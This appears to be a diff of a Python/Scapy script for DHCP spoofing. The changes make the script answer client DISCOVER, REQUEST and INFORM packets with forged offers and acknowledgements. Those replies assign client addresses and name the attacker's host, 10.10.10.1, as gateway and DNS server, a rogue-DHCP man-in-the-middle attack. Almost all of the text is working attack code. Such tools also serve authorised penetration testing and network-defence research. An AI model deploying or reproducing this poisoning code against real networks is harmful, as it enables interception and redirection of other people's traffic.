@@ -741,7 +741,7 @@ def look_for_dhcp_servers():
     if result_size > 0:
         print "[I] Found: " + str(result_size)
         answer = answered[0][1]
-        print "[!] " + answer.summary()
+        print "[!] " + answer.command()
         print "[+] Server IP: %s" % answer[IP].src
         for option in answer[DHCP].options:
             if type(option) == tuple:
@@ -764,7 +764,9 @@ def process_dhcp(pkt):
         requested_parameters = get_param_req_dict(options['param_req_list'])
         print "Parameters requested: %s" % str(requested_parameters).strip('[]')
     print "Command: %s" % str(pkt.command())
-    if request_type == "DHCPREQUEST":
+    if request_type == "DHCPDISCOVER" or \
+            request_type == "DHCPREQUEST" or \
+            request_type == "DHCPINFORM":
         print "[+] Recieved DHCPREQUEST from %s/%s. Sending ACK..." % (pkt[Ether].src, pkt[IP].src)
         poison_dhcp_client(pkt, request_type, requested_parameters) 
     print "-----------------------------------"
@@ -797,15 +799,16 @@ def poison_dhcp_client(pkt, request_type, requested_parameters):
     """Send poisoned response to the client
     """
     if request_type == "DHCPDISCOVER":
-        sendp(Ether(src="00:12:12:12:12:12", dst="ff:ff:ff:ff:ff:ff")/
+        print "DEBUG: Sending DISCOVER response"
+        print "pkt[Ether].src = %s" % str(pkt[Ether].src)
+        reply = (Ether(src="00:12:12:12:12:12", dst=pkt[Ether].src)/
             IP(src="10.10.10.1", dst="255.255.255.255")/
             UDP(sport=67,dport=68)/
             BOOTP(
                 op=2,
                 yiaddr='10.10.10.57',
                 siaddr='10.10.10.1',
-                giaddr='0.0.0.0',
-                chaddr=pkt[Ether].src,
+                chaddr=pkt.chaddr,
                 xid=pkt[BOOTP].xid
                 )/
             DHCP(options=[
@@ -821,10 +824,41 @@ def poison_dhcp_client(pkt, request_type, requested_parameters):
                     ]
                 )
             )
-
+        try:
+            print reply.command()
+            sendp(reply)
+        except Exception as e:
+            print e
     elif request_type == "DHCPREQUEST" or request_type == "DHCPINFORM":
-        pass
-
+        reply = (Ether(src="00:12:12:12:12:12", dst="ff:ff:ff:ff:ff:ff")/
+            IP(src="10.10.10.1", dst="255.255.255.255")/
+            UDP(sport=67,dport=68)/
+            BOOTP(
+                op=2,
+                yiaddr='10.10.10.57',
+                siaddr='10.10.10.1',
+                giaddr='0.0.0.0',
+                chaddr=pkt.chaddr,
+                xid=pkt[BOOTP].xid
+                )/
+            DHCP(options=[
+                    ('message-type', 5), 
+                    ('server_id', '10.10.10.1'), 
+                    ('lease_time', 18000), 
+                    ('subnet_mask', '255.255.255.0'), 
+                    ('router', '10.10.10.1'), 
+                    ('name_server', '10.10.10.1'), 
+                    ('domain', 'localdomain'), 
+                    ('broadcast_address', '10.10.10.255'), 
+                    'end', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad'
+                    ]
+                )
+            )
+        try:
+            print reply.command()
+            sendp(reply)
+        except Exception as e:
+            print e
 
 def main():
     print """
